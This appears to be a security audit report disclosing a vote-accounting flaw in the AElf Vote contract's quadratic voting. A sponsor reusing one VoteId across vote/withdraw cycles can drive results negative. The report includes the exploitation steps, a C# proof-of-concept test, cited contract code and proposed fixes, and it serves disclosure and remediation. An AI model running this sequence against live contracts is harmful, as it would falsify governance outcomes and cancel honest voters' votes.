# Audit Report

## Title
Quadratic Voting Accounting Mismatch Allows Voting Result Manipulation Through Persistent Vote Count

## Summary
The Vote contract contains a critical accounting vulnerability in quadratic voting where the `QuadraticVotesCountMap` counter persists across withdrawals and is never reset. Combined with an accounting mismatch where votes add 1 to results but withdrawals subtract the full token amount, this allows sponsors of delegated voting items to repeatedly vote and withdraw with the same `VoteId`, driving voting results negative and completely manipulating governance outcomes.

## Finding Description

The vulnerability stems from three interconnected issues in the Vote contract's quadratic voting implementation:

**Issue 1: Persistent Vote Counter**

When voting with quadratic voting enabled, the contract increments and stores a counter for each VoteId: [1](#0-0) 

This counter is stored in state and persists indefinitely: [2](#0-1) 

However, the `Withdraw()` method never resets or decrements this counter: [3](#0-2) 

**Issue 2: Accounting Mismatch**

When voting in quadratic mode, only 1 is added to voting results (not the token amount): [4](#0-3) 

The `UpdateVotingResult` method adds this value to both `Results[option]` and `VotesAmount`: [5](#0-4) 

However, when withdrawing, the full `votingRecord.Amount` (which equals `ticketCost * count`) is subtracted: [6](#0-5) 

**Issue 3: VoteId Reuse**

For delegated voting (`IsLockToken = false`), the sponsor provides the `VoteId`: [7](#0-6) 

The `Vote()` method overwrites any existing `VotingRecord` without validation: [8](#0-7) 

There is no check to prevent voting with a previously withdrawn `VoteId`, and the `IsWithdrawn` flag is reset when the record is overwritten.

**Exploitation Mechanics:**

The voting results use signed integers that can go negative: [9](#0-8) 

An attacker (sponsor) can exploit this by:
1. Creating a delegated quadratic voting item (`IsLockToken = false`)
2. Voting with VoteId X (QuadraticVotesCountMap[X] = 1, amount = 1, Results += 1)
3. Withdrawing with VoteId X (Results -= 1, but QuadraticVotesCountMap[X] still = 1)
4. Voting again with same VoteId X (QuadraticVotesCountMap[X] = 2, amount = 2, Results += 1)
5. Withdrawing with VoteId X (Results -= 2, creating net -1)

Each cycle deepens the negative value: Net after n cycles = n - ticketCost × n(n+1)/2

## Impact Explanation

This vulnerability has **CRITICAL** impact because it:

1. **Completely Breaks Voting Integrity**: An attacker can drive voting results to arbitrary negative values, making vote counts mathematically inconsistent and meaningless.

2. **Enables Governance Manipulation**: Any governance decisions based on delegated quadratic voting can be manipulated. The attacker has complete control over voting outcomes for items they sponsor.

3. **Violates Core Invariants**: Voting results and VotesAmount should never be negative. This breaks fundamental accounting rules and could cause downstream issues in systems that rely on these values.

4. **Affects All Delegated Quadratic Voting**: Any voting item created with `IsQuadratic = true` and `IsLockToken = false` is vulnerable. These are legitimate use cases for delegated voting scenarios.

5. **Nullifies Legitimate Votes**: Negative vote totals can cancel out legitimate positive votes from other participants, effectively disenfranchising honest voters.

## Likelihood Explanation

This vulnerability has **HIGH** likelihood because:

**Attacker Requirements:**
- Only needs to create a voting item via the public `Register()` method (requires only that the token is whitelisted)
- As the sponsor, has permission to call `Vote()` for delegated voting: [10](#0-9) 
- No token holdings required since delegated voting doesn't lock tokens

**Attack Complexity:**
- Simple sequence of public method calls (Register → Vote → Withdraw → Vote → Withdraw → ...)
- Deterministic and reproducible
- No timing constraints or race conditions
- No special knowledge required

**Detection Difficulty:**
- Individual transactions appear legitimate
- QuadraticVotesCountMap is internal state not commonly monitored
- Only aggregate analysis would reveal the manipulation

**Economic Feasibility:**
- Transaction costs are minimal (only gas fees)
- No capital lock-up required
- High reward potential for manipulating governance outcomes

## Recommendation

Implement the following fixes:

**Fix 1: Reset QuadraticVotesCountMap on Withdrawal**

In the `Withdraw()` method, reset the quadratic vote counter:

```csharp
public override Empty Withdraw(WithdrawInput input)
{
    var votingRecord = State.VotingRecords[input.VoteId];
    if (votingRecord == null) throw new AssertionException("Voting record not found.");
    var votingItem = State.VotingItems[votingRecord.VotingItemId];
    
    // ... existing permission checks ...
    
    // ADD THIS: Reset quadratic vote counter
    if (votingItem.IsQuadratic)
    {
        State.QuadraticVotesCountMap.Remove(input.VoteId);
    }
    
    // ... rest of withdrawal logic ...
}
```

**Fix 2: Prevent VoteId Reuse**

In the `Vote()` method, check if the VoteId was previously withdrawn:

```csharp
public override Empty Vote(VoteInput input)
{
    var votingItem = AssertValidVoteInput(input);
    
    // ADD THIS: Prevent reuse of withdrawn VoteIds
    var existingRecord = State.VotingRecords[input.VoteId];
    if (existingRecord != null && existingRecord.IsWithdrawn)
    {
        throw new AssertionException("Cannot reuse a withdrawn VoteId");
    }
    
    // ... rest of voting logic ...
}
```

**Fix 3: Fix Accounting Mismatch**

When withdrawing quadratic votes, subtract 1 (not the full amount) from voting results:

```csharp
var votingResult = State.VotingResults[votingResultHash];
var amountToSubtract = votingItem.IsQuadratic ? 1 : votingRecord.Amount;
votingResult.Results[votingRecord.Option] = 
    votingResult.Results[votingRecord.Option].Sub(amountToSubtract);
// ... but still subtract full amount from VotesAmount for token accounting
votingResult.VotesAmount = votingResult.VotesAmount.Sub(votingRecord.Amount);
```

## Proof of Concept

```csharp
[Fact]
public async Task QuadraticVoting_VoteId_Reuse_Creates_Negative_Results()
{
    // Setup: Register delegated quadratic voting item
    var startTime = TimestampHelper.GetUtcNow();
    var input = new VotingRegisterInput
    {
        TotalSnapshotNumber = 1,
        EndTimestamp = startTime.AddDays(100),
        StartTimestamp = startTime,
        Options = { "OptionA", "OptionB" },
        AcceptedCurrency = TestTokenSymbol,
        IsLockToken = false,  // Delegated voting
        IsQuadratic = true,   // Quadratic voting
        TicketCost = 1        // 1 token per vote
    };
    
    await VoteContractStub.Register.SendAsync(input);
    input.Options.Clear();
    var votingItemId = HashHelper.ConcatAndCompute(
        HashHelper.ComputeFrom(input), 
        HashHelper.ComputeFrom(DefaultSender)
    );
    
    // Attack: Use same VoteId for multiple vote-withdraw cycles
    var attackVoteId = HashHelper.ComputeFrom("attack");
    var voterAddress = Accounts[1].Address;
    
    // Cycle 1: Vote and Withdraw
    await VoteContractStub.Vote.SendAsync(new VoteInput
    {
        VotingItemId = votingItemId,
        Voter = voterAddress,
        VoteId = attackVoteId,
        Option = "OptionA",
        Amount = 0  // Ignored for quadratic voting
    });
    
    var result1 = await VoteContractStub.GetVotingResult.CallAsync(
        new GetVotingResultInput { VotingItemId = votingItemId, SnapshotNumber = 1 }
    );
    result1.Results["OptionA"].ShouldBe(1);  // Added 1
    result1.VotesAmount.ShouldBe(1);
    
    await VoteContractStub.Withdraw.SendAsync(new WithdrawInput { VoteId = attackVoteId });
    
    var result2 = await VoteContractStub.GetVotingResult.CallAsync(
        new GetVotingResultInput { VotingItemId = votingItemId, SnapshotNumber = 1 }
    );
    result2.Results["OptionA"].ShouldBe(0);  // Subtracted 1
    result2.VotesAmount.ShouldBe(0);
    
    // Cycle 2: Vote AGAIN with same VoteId and Withdraw
    await VoteContractStub.Vote.SendAsync(new VoteInput
    {
        VotingItemId = votingItemId,
        Voter = voterAddress,
        VoteId = attackVoteId,  // REUSING SAME VOTEID
        Option = "OptionA",
        Amount = 0
    });
    
    var result3 = await VoteContractStub.GetVotingResult.CallAsync(
        new GetVotingResultInput { VotingItemId = votingItemId, SnapshotNumber = 1 }
    );
    result3.Results["OptionA"].ShouldBe(1);  // Added 1 again
    result3.VotesAmount.ShouldBe(1);
    
    await VoteContractStub.Withdraw.SendAsync(new WithdrawInput { VoteId = attackVoteId });
    
    var result4 = await VoteContractStub.GetVotingResult.CallAsync(
        new GetVotingResultInput { VotingItemId = votingItemId, SnapshotNumber = 1 }
    );
    
    // VULNERABILITY: Result is now negative!
    result4.Results["OptionA"].ShouldBe(-1);  // 1 - 2 = -1
    result4.VotesAmount.ShouldBe(-1);
    
    // Can continue cycles to make it more negative
    // Cycle 3 would result in: -1 + 1 - 3 = -3
    // Cycle 4 would result in: -3 + 1 - 4 = -6
    // etc.
}
```

### Citations

**File:** contract/AElf.Contracts.Vote/VoteContract.cs (L100-102)
```csharp
            var currentVotesCount = State.QuadraticVotesCountMap[input.VoteId].Add(1);
            State.QuadraticVotesCountMap[input.VoteId] = currentVotesCount;
            amount = votingItem.TicketCost.Mul(currentVotesCount);
```

**File:** contract/AElf.Contracts.Vote/VoteContract.cs (L105-117)
```csharp
        var votingRecord = new VotingRecord
        {
            VotingItemId = input.VotingItemId,
            Amount = amount,
            SnapshotNumber = votingItem.CurrentSnapshotNumber,
            Option = input.Option,
            IsWithdrawn = false,
            VoteTimestamp = Context.CurrentBlockTime,
            Voter = input.Voter,
            IsChangeTarget = input.IsChangeTarget
        };

        State.VotingRecords[input.VoteId] = votingRecord;
```

**File:** contract/AElf.Contracts.Vote/VoteContract.cs (L119-119)
```csharp
        UpdateVotingResult(votingItem, input.Option, votingItem.IsQuadratic ? 1 : amount);
```

**File:** contract/AElf.Contracts.Vote/VoteContract.cs (L169-181)
```csharp
    private void UpdateVotingResult(VotingItem votingItem, string option, long amount)
    {
        // Update VotingResult based on this voting behaviour.
        var votingResultHash = GetVotingResultHash(votingItem.VotingItemId, votingItem.CurrentSnapshotNumber);
        var votingResult = State.VotingResults[votingResultHash];
        if (!votingResult.Results.ContainsKey(option)) votingResult.Results.Add(option, 0);

        var currentVotes = votingResult.Results[option];
        votingResult.Results[option] = currentVotes.Add(amount);
        votingResult.VotersCount = votingResult.VotersCount.Add(1);
        votingResult.VotesAmount = votingResult.VotesAmount.Add(amount);
        State.VotingResults[votingResultHash] = votingResult;
    }
```

**File:** contract/AElf.Contracts.Vote/VoteContract.cs (L191-239)
```csharp
    public override Empty Withdraw(WithdrawInput input)
    {
        var votingRecord = State.VotingRecords[input.VoteId];
        if (votingRecord == null) throw new AssertionException("Voting record not found.");
        var votingItem = State.VotingItems[votingRecord.VotingItemId];

        if (votingItem.IsLockToken)
            Assert(votingRecord.Voter == Context.Sender, "No permission to withdraw votes of others.");
        else
            Assert(votingItem.Sponsor == Context.Sender, "No permission to withdraw votes of others.");

        // Update VotingRecord.
        votingRecord.IsWithdrawn = true;
        votingRecord.WithdrawTimestamp = Context.CurrentBlockTime;
        State.VotingRecords[input.VoteId] = votingRecord;

        var votingResultHash = GetVotingResultHash(votingRecord.VotingItemId, votingRecord.SnapshotNumber);

        var votedItems = State.VotedItemsMap[votingRecord.Voter];
        votedItems.VotedItemVoteIds[votingItem.VotingItemId.ToHex()].ActiveVotes.Remove(input.VoteId);
        votedItems.VotedItemVoteIds[votingItem.VotingItemId.ToHex()].WithdrawnVotes.Add(input.VoteId);
        State.VotedItemsMap[votingRecord.Voter] = votedItems;

        var votingResult = State.VotingResults[votingResultHash];
        votingResult.Results[votingRecord.Option] =
            votingResult.Results[votingRecord.Option].Sub(votingRecord.Amount);
        if (!votedItems.VotedItemVoteIds[votingRecord.VotingItemId.ToHex()].ActiveVotes.Any())
            votingResult.VotersCount = votingResult.VotersCount.Sub(1);

        votingResult.VotesAmount = votingResult.VotesAmount.Sub(votingRecord.Amount);

        State.VotingResults[votingResultHash] = votingResult;

        if (votingItem.IsLockToken)
            State.TokenContract.Unlock.Send(new UnlockInput
            {
                Address = votingRecord.Voter,
                Symbol = votingItem.AcceptedCurrency,
                Amount = votingRecord.Amount,
                LockId = input.VoteId
            });

        Context.Fire(new Withdrawn
        {
            VoteId = input.VoteId
        });

        return new Empty();
    }
```

**File:** contract/AElf.Contracts.Vote/VoteContract.cs (L384-389)
```csharp
        if (!votingItem.IsLockToken)
        {
            Assert(votingItem.Sponsor == Context.Sender, "Sender of delegated voting event must be the Sponsor.");
            Assert(input.Voter != null, "Voter cannot be null if voting event is delegated.");
            Assert(input.VoteId != null, "Vote Id cannot be null if voting event is delegated.");
        }
```

**File:** contract/AElf.Contracts.Vote/VoteContractState.cs (L30-33)
```csharp
    /// <summary>
    ///     Vote Id -> Votes Count
    /// </summary>
    public MappedState<Hash, long> QuadraticVotesCountMap { get; set; }
```

**File:** protobuf/vote_contract.proto (L162-177)
```text
message VotingResult {
    // The voting activity id.
    aelf.Hash voting_item_id = 1;
    // The voting result, option -> amount of votes,
    map<string, int64> results = 2;
    // The snapshot number.
    int64 snapshot_number = 3;
    // The total number of voters.
    int64 voters_count = 4;
    // The start time of this snapshot.
    google.protobuf.Timestamp snapshot_start_timestamp = 5;
    // The end time of this snapshot.
    google.protobuf.Timestamp snapshot_end_timestamp = 6;
    // Total votes received during the process of this snapshot.
    int64 votes_amount = 7;
}
```
